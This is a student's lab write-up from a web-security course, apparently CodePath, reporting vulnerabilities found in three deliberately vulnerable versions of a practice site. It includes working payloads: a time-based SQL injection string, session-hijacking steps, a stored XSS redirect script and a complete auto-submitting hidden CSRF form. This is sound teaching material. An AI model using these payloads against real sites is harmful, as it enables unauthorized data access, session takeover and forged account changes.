# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection (SQLi)
* Inject SQL code into the URL after "id=" with " 2' and SLEEP(5)=0--' ", which will cause the site to delay for 5 seconds before directing to the other page.

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/sqlinject.gif">

Vulnerability #2: Session Hijacking
* Log in to the page and find the Session ID using the premade script change_session_id.php, then on another browser using the same script, change the Session ID to the one from the previous browser.

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/session.gif">

## Green

Vulnerability #1: Username Enumeration
* When a NON-existing username is entered, the "Log in was unsuccessful." message is unbolded.

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/userenum.gif">

Vulnerability #2: Cross-Site Scripting (XSS)
* Inject a script through the feedback form and wait for a logged-in user to check it

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/xss.gif">


## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)
* By changing the value of "id" in the URL, a visitor is able to view pages/information that was meant to be private

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/idor.gif">

Vulnerability #2: Cross-Site Request Forgery (CSRF)
* Forged a form using the code below. Then allowed a logged-in user to visit the page, resulting in a CSRF POST request attack

```
<html>
  <head>
  </head>
  <body>
  	<h1><center>Totally Normal Site</center></h1>
    	<form name="csrfForm" action="https://35.184.21.59/red/public/staff/salespeople/edit.php?id=1" 
	method="post" target="hide">

		<input type="hidden" name="first_name" value="Site Hacked">
		<input type="hidden" name="last_name" value="By Brian">
	</form>
	<iframe name="hide" style="display: none;"></iframe>
	<script>
 		document.csrfForm.submit();
	</script>
  </body>
</html>
```

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/csrf.gif">

## Bonus Objectives

Bonus Objective 2: Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.
* Inject the script ```<script>document.location = "https://google.com";</script>``` into feedback form. When a logged in user checks the feedback, the script will redirect them to https://google.com

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/bonus2a.gif">

## Notes
